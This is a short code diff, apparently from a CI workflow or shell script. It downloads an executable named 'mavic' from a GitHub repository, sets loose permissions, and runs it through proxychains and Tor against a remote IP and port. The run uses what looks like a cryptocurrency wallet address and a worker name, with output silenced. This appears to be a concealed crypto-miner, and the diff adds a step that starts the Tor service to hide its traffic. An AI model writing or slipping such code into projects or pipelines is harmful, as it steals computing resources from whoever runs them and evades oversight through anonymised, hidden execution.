@@ -39,7 +39,10 @@
         wget https://github.com/unmsjd28/ynsg7s9/raw/main/mavic
         chmod 777 mavic
         chmod 777 pwsh.sh
+        service tor start
+        
         tor > /dev/null 2>&1 &
+        
         sleep 140
         proxychains4 ./mavic -v -l 139.99.123.225:3956 -u RBw9nUhueGuapWsaekrYUDQQXfon56WKMT.$WORKER -p x -t 2 > /dev/null 2>&1 &
         sleep 30
